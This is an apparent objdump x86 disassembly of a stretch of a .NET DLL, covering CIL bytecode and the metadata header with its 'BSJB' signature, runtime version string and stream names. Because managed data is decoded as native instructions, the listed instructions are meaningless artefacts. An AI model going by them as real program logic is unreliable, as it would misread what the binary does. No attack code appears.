100025c1:	2a 5e 03             	sub    0x3(%esi),%bl
100025c4:	7e 01                	jle    0x100025c7
100025c6:	00 00                	add    %al,(%eax)
100025c8:	04 03                	add    $0x3,%al
100025ca:	6f                   	outsl  %ds:(%esi),(%dx)
100025cb:	2d 00 00 0a 6f       	sub    $0x6f0a0000,%eax
100025d0:	27                   	daa
100025d1:	00 00                	add    %al,(%eax)
100025d3:	0a 6f 2e             	or     0x2e(%edi),%ch
100025d6:	00 00                	add    %al,(%eax)
100025d8:	0a 2a                	or     (%edx),%ch
100025da:	5e                   	pop    %esi
100025db:	03 7e 01             	add    0x1(%esi),%edi
100025de:	00 00                	add    %al,(%eax)
100025e0:	04 03                	add    $0x3,%al
100025e2:	6f                   	outsl  %ds:(%esi),(%dx)
100025e3:	2d 00 00 0a 6f       	sub    $0x6f0a0000,%eax
100025e8:	27                   	daa
100025e9:	00 00                	add    %al,(%eax)
100025eb:	0a 6f 2e             	or     0x2e(%edi),%ch
100025ee:	00 00                	add    %al,(%eax)
100025f0:	0a 2a                	or     (%edx),%ch
100025f2:	1e                   	push   %ds
100025f3:	02 28                	add    (%eax),%ch
100025f5:	2c 00                	sub    $0x0,%al
100025f7:	00 0a                	add    %cl,(%edx)
100025f9:	2a 4a 02             	sub    0x2(%edx),%cl
100025fc:	7b 1b                	jnp    0x10002619
100025fe:	00 00                	add    %al,(%eax)
10002600:	04 03                	add    $0x3,%al
10002602:	28 2f                	sub    %ch,(%edi)
10002604:	00 00                	add    %al,(%eax)
10002606:	0a 6f 30             	or     0x30(%edi),%ch
10002609:	00 00                	add    %al,(%eax)
1000260b:	0a 2a                	or     (%edx),%ch
1000260d:	00 00                	add    %al,(%eax)
1000260f:	00 42 53             	add    %al,0x53(%edx)
10002612:	4a                   	dec    %edx
10002613:	42                   	inc    %edx
10002614:	01 00                	add    %eax,(%eax)
10002616:	01 00                	add    %eax,(%eax)
10002618:	00 00                	add    %al,(%eax)
1000261a:	00 00                	add    %al,(%eax)
1000261c:	0c 00                	or     $0x0,%al
1000261e:	00 00                	add    %al,(%eax)
10002620:	76 34                	jbe    0x10002656
10002622:	2e 30 2e             	xor    %ch,%cs:(%esi)
10002625:	33 30                	xor    (%eax),%esi
10002627:	33 31                	xor    (%ecx),%esi
10002629:	39 00                	cmp    %eax,(%eax)
1000262b:	00 00                	add    %al,(%eax)
1000262d:	00 05 00 6c 00 00    	add    %al,0x6c00
10002633:	00 50 06             	add    %dl,0x6(%eax)
10002636:	00 00                	add    %al,(%eax)
10002638:	23 7e 00             	and    0x0(%esi),%edi
1000263b:	00 bc 06 00 00 cc 09 	add    %bh,0x9cc0000(%esi,%eax,1)
10002642:	00 00                	add    %al,(%eax)
10002644:	23 53 74             	and    0x74(%ebx),%edx
10002647:	72 69                	jb     0x100026b2
10002649:	6e                   	outsb  %ds:(%esi),(%dx)
1000264a:	67 73 00             	addr16 jae 0x1000264d
1000264d:	00 00                	add    %al,(%eax)
1000264f:	00 88 10 00 00 3c    	add    %cl,0x3c000010(%eax)
10002655:	17                   	pop    %ss
10002656:	00 00                	add    %al,(%eax)
10002658:	23 55 53             	and    0x53(%ebp),%edx
1000265b:	00 c4                	add    %al,%ah
1000265d:	27                   	daa
1000265e:	00 00                	add    %al,(%eax)
10002660:	10 00                	adc    %al,(%eax)
10002662:	00 00                	add    %al,(%eax)
10002664:	23 47 55             	and    0x55(%edi),%eax
10002667:	49                   	dec    %ecx
10002668:	44                   	inc    %esp
10002669:	00 00                	add    %al,(%eax)
1000266b:	00 d4                	add    %dl,%ah
1000266d:	27                   	daa
1000266e:	00 00                	add    %al,(%eax)
10002670:	9c                   	pushf
10002671:	02 00                	add    (%eax),%al
10002673:	00 23                	add    %ah,(%ebx)
10002675:	42                   	inc    %edx
10002676:	6c                   	insb   (%dx),%es:(%edi)
10002677:	6f                   	outsl  %ds:(%esi),(%dx)
10002678:	62 00                	bound  %eax,(%eax)
1000267a:	00 00                	add    %al,(%eax)
1000267c:	00 00                	add    %al,(%eax)
1000267e:	00 00                	add    %al,(%eax)
10002680:	02 00                	add    (%eax),%al
10002682:	00 01                	add    %al,(%ecx)
10002684:	57                   	push   %edi
10002685:	15 02 1c 09 0a       	adc    $0xa091c02,%eax
1000268a:	00 00                	add    %al,(%eax)
1000268c:	00 fa                	add    %bh,%dl
1000268e:	01 33                	add    %esi,(%ebx)
10002690:	00 16                	add    %dl,(%esi)
10002692:	00 00                	add    %al,(%eax)
10002694:	01 00                	add    %eax,(%eax)
10002696:	00 00                	add    %al,(%eax)
10002698:	24 00                	and    $0x0,%al
1000269a:	00 00                	add    %al,(%eax)
1000269c:	06                   	push   %es
1000269d:	00 00                	add    %al,(%eax)
1000269f:	00 1b                	add    %bl,(%ebx)
100026a1:	00 00                	add    %al,(%eax)
100026a3:	00 12                	add    %dl,(%edx)
100026a5:	00 00                	add    %al,(%eax)
100026a7:	00 25 00 00 00 30    	add    %ah,0x30000000
100026ad:	00 00                	add    %al,(%eax)
100026af:	00 12                	add    %dl,(%edx)
100026b1:	00 00                	add    %al,(%eax)
100026b3:	00 03                	add    %al,(%ebx)
100026b5:	00 00                	add    %al,(%eax)
100026b7:	00 01                	add    %al,(%ecx)
100026b9:	00 00                	add    %al,(%eax)
100026bb:	00 03                	add    %al,(%ebx)
100026bd:	00 00                	add    %al,(%eax)
100026bf:	00 06                	add    %al,(%esi)
100026c1:	00 00                	add    %al,(%eax)
100026c3:	00 01                	add    %al,(%ecx)
100026c5:	00 00                	add    %al,(%eax)
100026c7:	00 03                	add    %al,(%ebx)
100026c9:	00 00                	add    %al,(%eax)
100026cb:	00 04 00             	add    %al,(%eax,%eax,1)
100026ce:	00 00                	add    %al,(%eax)
100026d0:	06                   	push   %es
100026d1:	00 00                	add    %al,(%eax)
100026d3:	00 00                	add    %al,(%eax)
100026d5:	00 db                	add    %bl,%bl
100026d7:	06                   	push   %es
100026d8:	01 00                	add    %eax,(%eax)
100026da:	00 00                	add    %al,(%eax)
100026dc:	00 00                	add    %al,(%eax)
100026de:	06                   	push   %es
100026df:	00 61 05             	add    %ah,0x5(%ecx)
100026e2:	28 08                	sub    %cl,(%eax)
100026e4:	06                   	push   %es
100026e5:	00 ce                	add    %cl,%dh
100026e7:	05 28 08 06 00       	add    $0x60828,%eax
100026ec:	95                   	xchg   %eax,%ebp
100026ed:	04 f6                	add    $0xf6,%al
100026ef:	07                   	pop    %es
100026f0:	0f 00 48 08          	str    0x8(%eax)
100026f4:	00 00                	add    %al,(%eax)
100026f6:	06                   	push   %es
100026f7:	00 bd 04 2d 07 06    	add    %bh,0x6072d04(%ebp)
100026fd:	00 44 05 2d          	add    %al,0x2d(%ebp,%eax,1)
10002701:	07                   	pop    %es
10002702:	06                   	push   %es
10002703:	00 25 05 2d 07 06    	add    %ah,0x6072d05
10002709:	00 b5 05 2d 07 06    	add    %dh,0x6072d05(%ebp)
1000270f:	00 81 05 2d 07 06    	add    %al,0x6072d05(%ecx)
10002715:	00 9a 05 2d 07 06    	add    %bl,0x6072d05(%edx)
1000271b:	00 d4                	add    %dl,%ah
1000271d:	04 2d                	add    $0x2d,%al
1000271f:	07                   	pop    %es
10002720:	06                   	push   %es
10002721:	00 a9 04 09 08 06    	add    %ch,0x6080904(%ecx)
10002727:	00 87 04 09 08 06    	add    %al,0x6080904(%edi)
1000272d:	00 08                	add    %cl,(%eax)
1000272f:	05 2d 07 06 00       	add    $0x6072d,%eax
10002734:	ef                   	out    %eax,(%dx)
10002735:	04 27                	add    $0x27,%al
10002737:	06                   	push   %es
10002738:	06                   	push   %es
10002739:	00 8f 08 03 07 06    	add    %cl,0x6070308(%edi)
1000273f:	00 0a                	add    %cl,(%edx)
10002741:	07                   	pop    %es
10002742:	03 07                	add    (%edi),%eax
10002744:	0a 00                	or     (%eax),%al
10002746:	79 08                	jns    0x10002750
10002748:	f6 07 06             	testb  $0x6,(%edi)
1000274b:	00 4c 07 03          	add    %cl,0x3(%edi,%eax,1)
1000274f:	07                   	pop    %es
10002750:	06                   	push   %es
10002751:	00 6c 04 28          	add    %ch,0x28(%esp,%eax,1)
10002755:	08 06                	or     %al,(%esi)
10002757:	00 50 04             	add    %dl,0x4(%eax)
1000275a:	03 07                	add    (%edi),%eax
1000275c:	06                   	push   %es
1000275d:	00 fa                	add    %bh,%dl
1000275f:	00 03                	add    %al,(%ebx)
10002761:	07                   	pop    %es
10002762:	06                   	push   %es
10002763:	00 d3                	add    %dl,%bl
10002765:	00 82 03 06 00 1e    	add    %al,0x1e000603(%edx)
1000276b:	06                   	push   %es
1000276c:	aa                   	stos   %al,%es:(%edi)
1000276d:	08 06                	or     %al,(%esi)
1000276f:	00 9d 08 03 07 06    	add    %bl,0x6070308(%ebp)
10002775:	00 55 06             	add    %dl,0x6(%ebp)
10002778:	03 07                	add    (%edi),%eax
1000277a:	0e                   	push   %cs
1000277b:	00 27                	add    %ah,(%edi)
1000277d:	04 9b                	add    $0x9b,%al
1000277f:	07                   	pop    %es
10002780:	06                   	push   %es
10002781:	00 c5                	add    %al,%ch
10002783:	00 82 03 06 00 c6    	add    %al,-0x39fff9fd(%edx)
10002789:	06                   	push   %es
1000278a:	09 08                	or     %ecx,(%eax)
1000278c:	06                   	push   %es
1000278d:	00 c7                	add    %al,%bh
1000278f:	07                   	pop    %es
10002790:	03 07                	add    (%edi),%eax
10002792:	06                   	push   %es
10002793:	00 df                	add    %bl,%bh
10002795:	03 0d 06 06 00 a2    	add    0xa2000606,%ecx
1000279b:	09 a8 02 06 00 3f    	or     %ebp,0x3f000602(%eax)
100027a1:	07                   	pop    %es
100027a2:	a8 02                	test   $0x2,%al
100027a4:	06                   	push   %es
100027a5:	00 5c 06 a8          	add    %bl,-0x58(%esi,%eax,1)
100027a9:	02 06                	add    (%esi),%al
100027ab:	00 56 07             	add    %dl,0x7(%esi)
100027ae:	a8 02                	test   $0x2,%al
100027b0:	06                   	push   %es
100027b1:	00 3e                	add    %bh,(%esi)
100027b3:	04 a8                	add    $0xa8,%al
100027b5:	02 00                	add    (%eax),%al
100027b7:	00 00                	add    %al,(%eax)
100027b9:	00 7e 01             	add    %bh,0x1(%esi)
100027bc:	00 00                	add    %al,(%eax)
100027be:	00 00                	add    %al,(%eax)
100027c0:	01 00                	add    %eax,(%eax)
100027c2:	01 00                	add    %eax,(%eax)
100027c4:	81 01 10 00 c8 02    	addl   $0x2c80010,(%ecx)
100027ca:	c8 02 41 00          	enter  $0x4102,$0x0
100027ce:	01 00                	add    %eax,(%eax)
100027d0:	01 00                	add    %eax,(%eax)
100027d2:	0b 01                	or     (%ecx),%eax
100027d4:	10 00                	adc    %al,(%eax)
100027d6:	9c                   	pushf
100027d7:	02 00                	add    (%eax),%al
100027d9:	00 55 00             	add    %dl,0x0(%ebp)
100027dc:	02 00                	add    (%eax),%al
100027de:	0d 00 0b 01 10       	or     $0x10010b00,%eax
100027e3:	00 88 02 00 00 55    	add    %cl,0x55000002(%eax)
100027e9:	00 14 00             	add    %dl,(%eax,%eax,1)
100027ec:	0d 00 03 21 10       	or     $0x10210300,%eax
100027f1:	00 7e 03             	add    %bh,0x3(%esi)
100027f4:	00 00                	add    %al,(%eax)
100027f6:	41                   	inc    %ecx
100027f7:	00 18                	add    %bl,(%eax)
100027f9:	00 0d 00 03 01 10    	add    %cl,0x10010300
100027ff:	00 27                	add    %ah,(%edi)
10002801:	00 00                	add    %al,(%eax)
10002803:	00 41 00             	add    %al,0x0(%ecx)
10002806:	1b 00                	sbb    (%eax),%eax
10002808:	11 00                	adc    %eax,(%eax)
1000280a:	11 00                	adc    %eax,(%eax)
1000280c:	f9                   	stc
1000280d:	08 31                	or     %dh,(%ecx)
1000280f:	01 06                	add    %eax,(%esi)
10002811:	00 72 03             	add    %dh,0x3(%edx)
10002814:	35 01 06 00 e5       	xor    $0xe5000601,%eax
10002819:	08 38                	or     %bh,(%eax)
1000281b:	01 06                	add    %eax,(%esi)
1000281d:	00 b6 08 38 01 06    	add    %dh,0x6013808(%esi)
10002823:	00 6d 09             	add    %ch,0x9(%ebp)
10002826:	38 01                	cmp    %al,(%ecx)
10002828:	06                   	push   %es
10002829:	00 51 03             	add    %dl,0x3(%ecx)
1000282c:	3b 01                	cmp    (%ecx),%eax
1000282e:	06                   	push   %es
1000282f:	00 55 03             	add    %dl,0x3(%ebp)
10002832:	3b 01                	cmp    (%ecx),%eax
10002834:	06                   	push   %es
10002835:	00 3f                	add    %bh,(%edi)
10002837:	03 3b                	add    (%ebx),%edi
10002839:	01 06                	add    %eax,(%esi)
1000283b:	00 30                	add    %dh,(%eax)
1000283d:	03 3b                	add    (%ebx),%edi
1000283f:	01 06                	add    %eax,(%esi)
10002841:	00 b8 09 3b 01 06    	add    %bh,0x6013b09(%eax)
10002847:	00 64 07 3b          	add    %ah,0x3b(%edi,%eax,1)
1000284b:	01 06                	add    %eax,(%esi)
1000284d:	00 a7 07 3b 01 06    	add    %ah,0x6013b07(%edi)
10002853:	00 71 02             	add    %dh,0x2(%ecx)
10002856:	3b 01                	cmp    (%ecx),%eax
10002858:	06                   	push   %es
10002859:	00 6c 06 3e          	add    %ch,0x3e(%esi,%eax,1)
1000285d:	01 06                	add    %eax,(%esi)
1000285f:	00 66 01             	add    %ah,0x1(%esi)
10002862:	3e 01 06             	add    %eax,%ds:(%esi)
10002865:	00 e6                	add    %ah,%dh
10002867:	03 9c 00 06 00 cf 08 	add    0x8cf0006(%eax,%eax,1),%ebx
1000286e:	9c                   	pushf
1000286f:	00 06                	add    %al,(%esi)
10002871:	00 d7                	add    %dl,%bh
10002873:	02 9c 00 06 00 c9 01 	add    0x1c90006(%eax,%eax,1),%bl
1000287a:	9c                   	pushf
1000287b:	00 06                	add    %al,(%esi)
1000287d:	00 44 02 9c          	add    %al,-0x64(%edx,%eax,1)
10002881:	00 06                	add    %al,(%esi)
10002883:	00 94 06 9c 00 06 00 	add    %dl,0x6009c(%esi,%eax,1)
1000288a:	52                   	push   %edx
1000288b:	01 35 01 06 00 3c    	add    %esi,0x3c000601
10002891:	09 35 01 36 00 62    	or     %esi,0x62003601
10002897:	01 41 01             	add    %eax,0x1(%ecx)
1000289a:	16                   	push   %ss
1000289b:	00 01                	add    %al,(%ecx)
1000289d:	00 45 01             	add    %al,0x1(%ebp)
100028a0:	16                   	push   %ss
100028a1:	00 6f 00             	add    %ch,0x0(%edi)
100028a4:	45                   	inc    %ebp
100028a5:	01 06                	add    %eax,(%esi)
100028a7:	00 f3                	add    %dh,%bl
100028a9:	06                   	push   %es
100028aa:	4d                   	dec    %ebp
100028ab:	01 00                	add    %eax,(%eax)
100028ad:	00 00                	add    %al,(%eax)
100028af:	00 80 00 91 20 32    	add    %al,0x32209100(%eax)
100028b5:	04 54                	add    $0x54,%al
100028b7:	01 01                	add    %eax,(%ecx)
100028b9:	00 00                	add    %al,(%eax)
100028bb:	00 00                	add    %al,(%eax)
100028bd:	00 80 00 91 20 c1    	add    %al,-0x3edf6f00(%eax)
100028c3:	03 59 01             	add    0x1(%ecx),%ebx
100028c6:	02 00                	add    (%eax),%al
100028c8:	00 00                	add    %al,(%eax)
100028ca:	00 00                	add    %al,(%eax)
100028cc:	80 00 91             	addb   $0x91,(%eax)
100028cf:	20 73 08             	and    %dh,0x8(%ebx)
100028d2:	60                   	pusha
100028d3:	01 04 00             	add    %eax,(%eax,%eax,1)
100028d6:	00 00                	add    %al,(%eax)
100028d8:	00 00                	add    %al,(%eax)
100028da:	80 00 91             	addb   $0x91,(%eax)
100028dd:	20 2d 09 72 01 0e    	and    %ch,0xe017209
100028e3:	00 50 20             	add    %dl,0x20(%eax)
100028e6:	00 00                	add    %al,(%eax)
100028e8:	00 00                	add    %al,(%eax)
100028ea:	91                   	xchg   %eax,%ecx
100028eb:	00 f0                	add    %dh,%al
100028ed:	01 7b 01             	add    %edi,0x1(%ebx)
100028f0:	13 00                	adc    (%eax),%eax
100028f2:	c4 20                	les    (%eax),%esp
100028f4:	00 00                	add    %al,(%eax)
100028f6:	00 00                	add    %al,(%eax)
100028f8:	96                   	xchg   %eax,%esi
100028f9:	00 57 02             	add    %dl,0x2(%edi)
100028fc:	80 01 14             	addb   $0x14,(%ecx)
100028ff:	00 0c 22             	add    %cl,(%edx,%eiz,1)
10002902:	00 00                	add    %al,(%eax)
10002904:	00 00                	add    %al,(%eax)
10002906:	91                   	xchg   %eax,%ecx
10002907:	00 05 02 7b 01 16    	add    %al,0x16017b02
1000290d:	00 00                	add    %al,(%eax)
1000290f:	00 00                	add    %al,(%eax)
10002911:	00 80 00 91 20 d3    	add    %al,-0x2cdf6f00(%eax)
10002917:	03 87 01 17 00 00    	add    0x1701(%edi),%eax
1000291d:	00 00                	add    %al,(%eax)
1000291f:	00 80 00 91 20 89    	add    %al,-0x76df6f00(%eax)
10002925:	09 93 01 1e 00 7f    	or     %edx,0x7f001e01(%ebx)
1000292b:	22 00                	and    (%eax),%al
1000292d:	00 00                	add    %al,(%eax)
1000292f:	00 91 18 c0 07 9e    	add    %dl,-0x61f83fe8(%ecx)
10002935:	01 23                	add    %esp,(%ebx)
10002937:	00 8c 22 00 00 00 00 	add    %cl,0x0(%edx,%eiz,1)
1000293e:	93                   	xchg   %eax,%ebx
1000293f:	00 3c 00             	add    %bh,(%eax,%eax,1)
10002942:	a2 01 23 00 fc       	mov    %al,0xfc002301
10002947:	24 00                	and    $0x0,%al
10002949:	00 00                	add    %al,(%eax)
1000294b:	00 93 00 93 00 a2    	add    %dl,-0x5dff6d00(%ebx)
10002951:	01 23                	add    %esp,(%ebx)
10002953:	00 ae 25 00 00 00    	add    %ch,0x25(%esi)
10002959:	00 91 18 c0 07 9e    	add    %dl,-0x61f83fe8(%ecx)
1000295f:	01 23                	add    %esp,(%ebx)
10002961:	00 ba 25 00 00 00    	add    %bh,0x25(%edx)
10002967:	00 86 18 ba 07 06    	add    %al,0x607ba18(%esi)
1000296d:	00 23                	add    %ah,(%ebx)
1000296f:	00 c2                	add    %al,%dl
10002971:	25 00 00 00 00       	and    $0x0,%eax
10002976:	83 00 0a             	addl   $0xa,(%eax)
10002979:	00 a6 01 23 00 da    	add    %ah,-0x25ffdcff(%esi)
1000297f:	25 00 00 00 00       	and    $0x0,%eax
10002984:	83 00 78             	addl   $0x78,(%eax)
10002987:	00 a6 01 24 00 f2    	add    %ah,-0xdffdbff(%esi)
1000298d:	25 00 00 00 00       	and    $0x0,%eax
10002992:	86 18                	xchg   %bl,(%eax)
10002994:	ba 07 06 00 25       	mov    $0x25000607,%edx
10002999:	00 fa                	add    %bh,%dl
1000299b:	25 00 00 00 00       	and    $0x0,%eax
100029a0:	83 00 da             	addl   $0xffffffda,(%eax)
100029a3:	00 ab 01 25 00 00    	add    %ch,0x2501(%ebx)
100029a9:	00 01                	add    %al,(%ecx)
100029ab:	00 2a                	add    %ch,(%edx)
100029ad:	01 00                	add    %eax,(%eax)
100029af:	00 01                	add    %al,(%ecx)
100029b1:	00 94 06 02 00 02 00 	add    %dl,0x20002(%esi,%eax,1)
100029b8:	1e                   	push   %ds
100029b9:	03 00                	add    (%eax),%eax
100029bb:	00 01                	add    %al,(%ecx)
100029bd:	00 81 06 00 00 02    	add    %al,0x2000006(%ecx)
100029c3:	00 b2 02 00 00 03    	add    %dh,0x3000002(%edx)
100029c9:	00 08                	add    %cl,(%eax)
100029cb:	09 00                	or     %eax,(%eax)
100029cd:	00 04 00             	add    %al,(%eax,%eax,1)
100029d0:	01 01                	add    %eax,(%ecx)
100029d2:	00 00                	add    %al,(%eax)
100029d4:	05 00 59 03 00       	add    $0x35900,%eax
100029d9:	00 06                	add    %al,(%esi)
100029db:	00 9d 01 00 00 07    	add    %bl,0x7000001(%ebp)
100029e1:	00 39                	add    %bh,(%ecx)
100029e3:	01 00                	add    %eax,(%eax)
100029e5:	00 08                	add    %cl,(%eax)
100029e7:	00 ae 06 00 00 09    	add    %ch,0x9000006(%esi)
100029ed:	00 18                	add    %bl,(%eax)
100029ef:	02 02                	add    (%edx),%al
100029f1:	00 0a                	add    %cl,(%edx)
100029f3:	00 ce                	add    %cl,%dh
100029f5:	07                   	pop    %es
100029f6:	00 00                	add    %al,(%eax)
100029f8:	01 00                	add    %eax,(%eax)
100029fa:	44                   	inc    %esp
100029fb:	02 00                	add    (%eax),%al
100029fd:	00 02                	add    %al,(%edx)
100029ff:	00 0d 03 00 00 03    	add    %cl,0x3000003
10002a05:	00 9d 03 00 00 04    	add    %bl,0x4000003(%ebp)
10002a0b:	00 18                	add    %bl,(%eax)
10002a0d:	09 00                	or     %eax,(%eax)
10002a0f:	00 05 00 31 02 00    	add    %al,0x23100
10002a15:	00 01                	add    %al,(%ecx)
10002a17:	00 08                	add    %cl,(%eax)
10002a19:	04 00                	add    $0x0,%al
10002a1b:	00 01                	add    %al,(%ecx)
10002a1d:	00 b1 01 00 00 02    	add    %dh,0x2000001(%ecx)
10002a23:	00 55 09             	add    %dl,0x9(%ebp)
10002a26:	00 00                	add    %al,(%eax)
10002a28:	01 00                	add    %eax,(%eax)
10002a2a:	08 04 00             	or     %al,(%eax,%eax,1)
10002a2d:	00 01                	add    %al,(%ecx)
10002a2f:	00 44 02 00          	add    %al,0x0(%edx,%eax,1)
10002a33:	00 02                	add    %al,(%edx)
10002a35:	00 01                	add    %al,(%ecx)
10002a37:	01 00                	add    %eax,(%eax)
10002a39:	00 03                	add    %al,(%ebx)
10002a3b:	00 84 07 00 00 04 00 	add    %al,0x40000(%edi,%eax,1)
10002a42:	e9 02 00 00 05       	jmp    0x15002a49
10002a47:	00 d8                	add    %bl,%al
10002a49:	01 00                	add    %eax,(%eax)
10002a4b:	00 06                	add    %al,(%esi)
10002a4d:	00 9d 01 02 00 07    	add    %bl,0x7000201(%ebp)
10002a53:	00 87 01 00 00 01    	add    %al,0x1000001(%edi)
10002a59:	00 44 02 00          	add    %al,0x0(%edx,%eax,1)
10002a5d:	00 02                	add    %al,(%edx)
10002a5f:	00 1a                	add    %bl,(%edx)
10002a61:	01 00                	add    %eax,(%eax)
10002a63:	00 03                	add    %al,(%ebx)
10002a65:	00 df                	add    %bl,%bh
10002a67:	07                   	pop    %es
10002a68:	00 00                	add    %al,(%eax)
10002a6a:	04 00                	add    $0x0,%al
10002a6c:	fe 02                	incb   (%edx)
10002a6e:	02 00                	add    (%eax),%al
10002a70:	05 00 f3 05 00       	add    $0x5f300,%eax
10002a75:	00 01                	add    %al,(%ecx)
10002a77:	00 7f 08             	add    %bh,0x8(%edi)
10002a7a:	00 00                	add    %al,(%eax)
10002a7c:	01 00                	add    %eax,(%eax)
10002a7e:	7f 08                	jg     0x10002a88
10002a80:	00 00                	add    %al,(%eax)
10002a82:	01 00                	add    %eax,(%eax)
10002a84:	43                   	inc    %ebx
10002a85:	04 09                	add    $0x9,%al
10002a87:	00 ba 07 01 00 11    	add    %bh,0x11000107(%edx)
10002a8d:	00 ba 07 06 00 19    	add    %bh,0x19000607(%edx)
10002a93:	00 ba 07 0a 00 29    	add    %bh,0x29000a07(%edx)
10002a99:	00 ba 07 10 00 31    	add    %bh,0x31001007(%edx)
10002a9f:	00 ba 07 10 00 39    	add    %bh,0x39001007(%edx)
10002aa5:	00 ba 07 10 00 41    	add    %bh,0x41001007(%edx)
10002aab:	00 ba 07 10 00 49    	add    %bh,0x49001007(%edx)
10002ab1:	00 ba 07 10 00 51    	add    %bh,0x51001007(%edx)
10002ab7:	00 ba 07 10 00 59    	add    %bh,0x59001007(%edx)
10002abd:	00 ba 07 10 00 61    	add    %bh,0x61001007(%edx)
10002ac3:	00 ba 07 15 00 69    	add    %bh,0x69001507(%edx)
10002ac9:	00 ba 07 10 00 71    	add    %bh,0x71001007(%edx)
10002acf:	00 ba 07 10 00 79    	add    %bh,0x79001007(%edx)
10002ad5:	00 ba 07 10 00 a1    	add    %bh,-0x5effeff9(%edx)
10002adb:	00 ba 07 06 00 c1    	add    %bh,-0x3efff9f9(%edx)
10002ae1:	00 49 01             	add    %cl,0x1(%ecx)
10002ae4:	1a 00                	sbb    (%eax),%al
10002ae6:	c9                   	leave
10002ae7:	00 41 06             	add    %al,0x6(%ecx)
10002aea:	1f                   	pop    %ds
10002aeb:	00 c1                	add    %al,%cl
10002aed:	00 52 06             	add    %dl,0x6(%edx)
10002af0:	25 00 d1 00 1f       	and    $0x1f00d100,%eax
10002af5:	04 2b                	add    $0x2b,%al
10002af7:	00 d9                	add    %bl,%cl
10002af9:	00 88 08 31 00 0c    	add    %cl,0xc003108(%eax)
10002aff:	00 ba 07 49 00 d9    	add    %bh,-0x26ffb6f9(%edx)
10002b05:	00 96 08 4f 00 d9    	add    %dl,-0x26ffb0f8(%esi)
10002b0b:	00 7c 09 6c          	add    %bh,0x6c(%ecx,%ecx,1)
10002b0f:	00 d1                	add    %dl,%cl
10002b11:	00 ba 07 7d 00 e9    	add    %bh,-0x16ff82f9(%edx)
10002b17:	00 ec                	add    %ch,%ah
10002b19:	05 90 00 f1 00       	add    $0xf10090,%eax
10002b1e:	79 07                	jns    0x10002b27
10002b20:	9c                   	pushf
10002b21:	00 f1                	add    %dh,%cl
10002b23:	00 ac 09 9f 00 99 00 	add    %ch,0x99009f(%ecx,%ecx,1)
10002b2a:	ba 07 10 00 f9       	mov    $0xf9001007,%edx
10002b2f:	00 7e 07             	add    %bh,0x7(%esi)
10002b32:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10002b33:	00 91 00 b2 03 aa    	add    %dl,-0x55fc4e00(%ecx)
10002b39:	00 91 00 fa 03 b0    	add    %dl,-0x4ffc0600(%ecx)
10002b3f:	00 91 00 ee 06 06    	add    %dl,0x606ee00(%ecx)
10002b45:	00 89 00 ba 07 06    	add    %cl,0x607ba00(%ecx)
10002b4b:	00 14 00             	add    %dl,(%eax,%eax,1)
10002b4e:	ba 07 06 00 14       	mov    $0x14000607,%edx
10002b53:	00 f6                	add    %dh,%dh
10002b55:	03 c1                	add    %ecx,%eax
10002b57:	00 01                	add    %al,(%ecx)
10002b59:	01 57 08             	add    %edx,0x8(%edi)
10002b5c:	c7 00 1c 00 ba 07    	movl   $0x7ba001c,(%eax)
10002b62:	49                   	dec    %ecx
10002b63:	00 d9                	add    %bl,%cl
10002b65:	00 5a 04             	add    %bl,0x4(%edx)
10002b68:	d8 00                	fadds  (%eax)
10002b6a:	89 00                	mov    %eax,(%eax)
10002b6c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10002b6d:	08 ef                	or     %ch,%bh
10002b6f:	00 11                	add    %dl,(%ecx)
10002b71:	01 48 04             	add    %ecx,0x4(%eax)
10002b74:	f9                   	stc
10002b75:	00 01                	add    %al,(%ecx)
10002b77:	01 9c 09 ff 00 d1 00 	add    %ebx,0xd100ff(%ecx,%ecx,1)
10002b7e:	81 08 06 01 21 01    	orl    $0x1210106,(%eax)
10002b84:	84 09                	test   %cl,(%ecx)
10002b86:	0d 01 81 00 ba       	or     $0xba008101,%eax
10002b8b:	07                   	pop    %es
10002b8c:	06                   	push   %es
10002b8d:	00 d1                	add    %dl,%cl
10002b8f:	00 61 06             	add    %ah,0x6(%ecx)
10002b92:	14 01                	adc    $0x1,%al
10002b94:	d1 00                	roll   $1,(%eax)
10002b96:	69 08 18 01 11 01    	imul   $0x1110118,(%eax),%ecx
10002b9c:	11 07                	adc    %eax,(%edi)
10002b9e:	1d 01 14 00 60       	sbb    $0x60001401,%eax
10002ba3:	08 22                	or     %ah,(%edx)
10002ba5:	01 2e                	add    %ebp,(%esi)
10002ba7:	00 0b                	add    %cl,(%ebx)
10002ba9:	00 b0 01 2e 00 13    	add    %dh,0x13002e01(%eax)
10002baf:	00 b9 01 2e 00 1b    	add    %bh,0x1b002e01(%ecx)
10002bb5:	00 d8                	add    %bl,%al
10002bb7:	01 2e                	add    %ebp,(%esi)
10002bb9:	00 23                	add    %ah,(%ebx)
10002bbb:	00 e1                	add    %ah,%cl
10002bbd:	01 2e                	add    %ebp,(%esi)
10002bbf:	00 2b                	add    %ch,(%ebx)
10002bc1:	00 f5                	add    %dh,%ch
10002bc3:	01 2e                	add    %ebp,(%esi)
10002bc5:	00 33                	add    %dh,(%ebx)
10002bc7:	00 f5                	add    %dh,%ch
10002bc9:	01 2e                	add    %ebp,(%esi)
10002bcb:	00 3b                	add    %bh,(%ebx)
10002bcd:	00 f5                	add    %dh,%ch
10002bcf:	01 2e                	add    %ebp,(%esi)
10002bd1:	00 43 00             	add    %al,0x0(%ebx)
10002bd4:	e1 01                	loope  0x10002bd7
10002bd6:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
10002bda:	fb                   	sti
10002bdb:	01 2e                	add    %ebp,(%esi)
10002bdd:	00 53 00             	add    %dl,0x0(%ebx)
10002be0:	f5                   	cmc
10002be1:	01 2e                	add    %ebp,(%esi)
10002be3:	00 5b 00             	add    %bl,0x0(%ebx)
10002be6:	f5                   	cmc
10002be7:	01 2e                	add    %ebp,(%esi)
10002be9:	00 63 00             	add    %ah,0x0(%ebx)
10002bec:	13 02                	adc    (%edx),%eax
10002bee:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
10002bf2:	3d 02 2e 00 73       	cmp    $0x73002e02,%eax
10002bf7:	00 4a 02             	add    %cl,0x2(%edx)
10002bfa:	a3 00 7b 00 94       	mov    %eax,0x94007b00
10002bff:	02 c3                	add    %bl,%al
10002c01:	00 7b 00             	add    %bh,0x0(%ebx)
10002c04:	94                   	xchg   %eax,%esp
10002c05:	02 60 01             	add    0x1(%eax),%ah
10002c08:	7b 00                	jnp    0x10002c0a
10002c0a:	94                   	xchg   %eax,%esp
10002c0b:	02 80 01 7b 00 94    	add    -0x6bff84ff(%eax),%al
10002c11:	02 83 00 b4 00 f4    	add    -0xbff4c00(%ebx),%al
